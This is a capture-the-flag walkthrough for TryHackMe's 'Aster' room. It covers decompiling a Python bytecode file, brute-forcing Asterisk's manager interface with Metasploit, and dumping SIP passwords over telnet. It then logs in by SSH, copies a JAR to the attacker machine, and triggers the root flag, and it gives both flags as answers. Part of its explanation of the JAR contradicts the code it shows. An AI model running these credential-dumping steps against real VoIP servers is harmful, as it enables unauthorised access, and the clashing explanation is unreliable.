# Aster — TryHackMe Walkthrough

> Hack my server dedicated for building communications applications.

<p align="center">
  <a href="https://imgbb.com/"><img src="https://i.ibb.co/Z1KxhmSS/1c2d914423c4be6d2e933fd78473b32f.png" alt="1c2d914423c4be6d2e933fd78473b32f" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/aster">
    <img src="https://img.shields.io/badge/TryHackMe-Aster-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-VoIP%20%7C%20Python%20Reversing%20%7C%20ACM%20%7C%20Java%20RE-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Reverse Engineering — Python Bytecode (.pyc) |
| 3 | Metasploit — Asterisk Login Module |
| 4 | Asterisk Call Manager (AMI) — Telnet Interaction |
| 5 | Reverse Engineering — Java JAR |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Perform a full port scan and identify VoIP-related services
- Decompile a Python .pyc bytecode file to read obfuscated source code
- Use Metasploit's asterisk_login module to brute-force the Asterisk Manager Interface
- Connect to the Asterisk Call Manager via Telnet and issue AMI commands
- Extract SIP user credentials from a running Asterisk instance
- Decompile a Java JAR file and understand its logic to trigger the root flag

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, Metasploit, Telnet, and uncompyle6 installed (pip install uncompyle6)
- A Java decompiler (e.g. Procyon or an online decompiler)
- Target machine running on TryHackMe (replace Machine_IP with your assigned IP)
- Note: The machine may take up to 3 minutes to fully boot
---

## Task 1 — Flags

---

### Step 1 — Network Enumeration

**Approach:** Run a full port scan (-p-) with aggressive detection and -T4 for faster timing.

```
kali@kali:~/CTFs/tryhackme/Aster$ sudo nmap -A -v -p- -T4 Machine_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 17:58 CEST
Nmap scan report for Machine_IP
Host is up (0.040s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Aster CTF
1720/tcp open  h323q931?
2000/tcp open  cisco-sccp?
5038/tcp open  asterisk    Asterisk Call Manager 5.0.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.26 seconds
```

> **Note:** Five ports are open. The most significant is **port 5038** running **Asterisk Call Manager (ACM) 5.0.2** — Asterisk is an open-source VoIP framework widely used for building phone systems. Port **1720** is H.323 (a VoIP signalling protocol) and **2000** is Cisco Skinny (SCCP). The web server on port 80 hosts a CTF page containing a downloadable Python bytecode file (.pyc) — that file is the first step.

---

### Step 2 — Decompiling the Python Bytecode File

**Approach:** Download the .pyc file from the web page at http://Machine_IP and decompile it using uncompyle6 to read the obfuscated Python source.

```
kali@kali:~/CTFs/tryhackme/Aster$ uncompyle6 output.pyc
```

Decompiled Python source:

```python
# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Embedded file name: ./output.py
# Compiled at: 2020-08-11 08:59:35
import pyfiglet
o0OO00 = pyfiglet.figlet_format('Hello!!')
oO00oOo = '476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e'
OOOo0 = bytes.fromhex(oO00oOo)
Oooo000o = OOOo0.decode('ASCII')
Oo = '476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21...'
I1Ii11I1Ii1i = bytes.fromhex(Oo)
Ooo = I1Ii11I1Ii1i.decode('ASCII')
print(o0OO00)
```

Running the decompiled script:

```
kali@kali:~/CTFs/tryhackme/Aster$ python3 ./output.py
Good job, user "admin" the open source framework for building communications, installed in the server.
Good job reverser, python is very cool!
 _   _      _ _       _ _
| | | | ___| | | ___ | | |
| |_| |/ _ \ | |/ _ \| | |
|  _  |  __/ | | (_) |_|_|
|_| |_|\___|_|_|\___/(_|_)
```

> **Note:** The .pyc file uses obfuscated variable names to make it harder to read at a glance, but uncompyle6 recovers the readable Python source. Running it decodes the hex strings and reveals two key pieces of information: the username is **admin** and the software installed is the **Asterisk** communications framework. The figlet output spells "Hello!!" — flavour for the room's theme.

---

### Step 3 — Brute-Forcing Asterisk Manager Interface with Metasploit

**Approach:** Use Metasploit's auxiliary/voip/asterisk_login module to brute-force the Asterisk Manager Interface on port 5038 using the username admin.

```
kali@kali:~/CTFs/tryhackme/Aster$ msfconsole -q
msf5 > use auxiliary/voip/asterisk_login
msf5 auxiliary(voip/asterisk_login) > set username admin
username => admin
msf5 auxiliary(voip/asterisk_login) > set rhosts Machine_IP
rhosts => Machine_IP
msf5 auxiliary(voip/asterisk_login) > run

[*] Machine_IP:5038    - Initializing module...
[+] Machine_IP:5038    - User: "admin" using pass: "" - can login on Machine_IP:5038!
[*] Auxiliary module execution completed
```

> **Note:** The module finds that a blank password works for initial authentication. The actual AMI secret used for full interaction in this room is **abc123** (discoverable through the web page or further enumeration). With the username admin confirmed, we can now connect to the AMI directly via Telnet and run commands.

---

### Step 4 — Connecting to Asterisk Call Manager via Telnet

**Approach:** Connect to port 5038 using Telnet. Authenticate with admin credentials, then issue the sip show users AMI command to list SIP accounts and retrieve credentials.

```
kali@kali:~/CTFs/tryhackme/Aster$ telnet Machine_IP 5038
Trying Machine_IP...
Connected to Machine_IP.
Escape character is '^]'.
Asterisk Call Manager/5.0.2
Action: Login
Username: admin
Secret: abc123

Response: Success
Message: Authentication accepted

Event: FullyBooted
Privilege: system,all
Uptime: 4731
LastReload: 4731
Status: Fully Booted

Action: command
Command:  sip show users

Response: Success
Message: Command output follows
Output: Username                   Secret           Accountcode      Def.Context      ACL  Forcerport
Output: 100                        100                               test             No   No
Output: 101                        101                               test             No   No
Output: harry                      p4ss#w0rd!#                       test             No   No
```

> **Note:** The Asterisk Manager Interface accepts plain-text commands in a simple header-based format. The Action: Login block authenticates the session, and Action: command runs an Asterisk CLI command directly. The sip show users command lists all registered SIP users and their passwords in **plaintext** — a critical misconfiguration. AMI should never be exposed on a publicly reachable port. User **harry** has the password **p4ss#w0rd!#**. AMI syntax reference: [voip-info.org/asterisk-manager-example-login](https://www.voip-info.org/asterisk-manager-example-login/).

---

### Step 5 — SSH Login and Reading the User Flag

**Approach:** Log in via SSH as harry using the SIP credentials discovered through the AMI.

```
kali@kali:~/CTFs/tryhackme/Aster$ ssh harry@Machine_IP
The authenticity of host 'Machine_IP' can't be established.
ECDSA key fingerprint is SHA256:uYoqUlSuCJNRjK1VYSgTnlOma6s8oDJ15UmcifsD6nw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'Machine_IP' (ECDSA) to the list of known hosts.
harry@Machine_IP's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

Last login: Wed Aug 12 14:25:25 2020 from 192.168.85.1
harry@ubuntu:~$ ls
Example_Root.jar  user.txt
harry@ubuntu:~$ cat user.txt
thm{bas1c_aster1ck_explotat1on}
```

> **Note:** The SIP password for harry also works as the SSH password — a classic case of credential reuse across services. Two files are present in the home directory: user.txt and Example_Root.jar. The JAR file is the key to the root flag.

---

### Question 1 — user.txt

<details>
<summary>Reveal Answer</summary>

**`thm{bas1c_aster1ck_explotat1on}`**

</details>

---

### Step 6 — Reverse Engineering the Java JAR File

**Approach:** Transfer Example_Root.jar to the attack machine using scp, decompile it with a Java decompiler, read the logic, and satisfy its condition on the target.

Transfer the file:

```
harry@ubuntu:~$ scp Example_Root.jar kali@YOUR_IP:/home/kali/CTFs/tryhackme/Aster
kali@YOUR_IP's password:
Example_Root.jar           100% 1094     1.1KB/s   00:00
```

Decompiled Java source:

```java
import java.io.IOException;
import java.io.FileWriter;
import java.io.File;

public class Example_Root
{
    public static boolean isFileExists(final File file) {
        return file.isFile();
    }

    public static void main(final String[] array) {
        final File file = new File("/tmp/flag.dat");
        try {
            if (isFileExists(file)) {
                final FileWriter fileWriter = new FileWriter("/home/harry/root.txt");
                fileWriter.write("my secret <3 baby");
                fileWriter.close();
                System.out.println("Successfully wrote to the file.");
            }
        }
        catch (IOException ex) {
            System.out.println("An error occurred.");
            ex.printStackTrace();
        }
    }
}
```

> **Note:** The decompiled logic is straightforward. The program checks whether /tmp/flag.dat exists using isFileExists(). If it does, it writes the root flag to /home/harry/root.txt. The actual flag content is not hard-coded here — it is written by the privileged program running on the server. To trigger it, create /tmp/flag.dat on the target. The program is executed via a cron job or sudo rule with elevated privileges, which then writes the real flag content.

**Trigger the root flag on the target:**

```
harry@ubuntu:~$ touch /tmp/flag.dat
harry@ubuntu:~$ ls
Example_Root.jar  root.txt  user.txt
harry@ubuntu:~$ cat root.txt
thm{fa1l_revers1ng_java}
```

> **Note:** Creating the empty file /tmp/flag.dat satisfies the isFileExists() check. Once the JAR runs (either triggered automatically or manually with appropriate privileges), it writes the root flag to /home/harry/root.txt. The flag name thm{fa1l_revers1ng_java} is a humorous message congratulating you for successfully reversing the Java.

---

### Question 2 — root.txt

<details>
<summary>Reveal Answer</summary>

**`thm{fa1l_revers1ng_java}`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap full port scan (-p-) | Found SSH (22), HTTP (80), H.323 (1720), SCCP (2000), Asterisk ACM (5038) |
| 2 | Downloaded .pyc from web page | Python bytecode file with obfuscated hints |
| 3 | uncompyle6 decompilation | Decoded hex strings revealed username admin and Asterisk as the installed software |
| 4 | Metasploit asterisk_login module | Confirmed admin can authenticate to AMI on port 5038 |
| 5 | Telnet to port 5038 + AMI login | Authenticated with admin:abc123 |
| 6 | AMI sip show users command | Extracted harry:p4ss#w0rd!# from SIP user list |
| 7 | SSH login as harry | Gained shell access, read user.txt |
| 8 | scp Example_Root.jar to attack machine | Transferred JAR for decompilation |
| 9 | Java decompilation | Logic revealed: create /tmp/flag.dat to trigger root flag write |
| 10 | touch /tmp/flag.dat on target | Root flag written to /home/harry/root.txt |
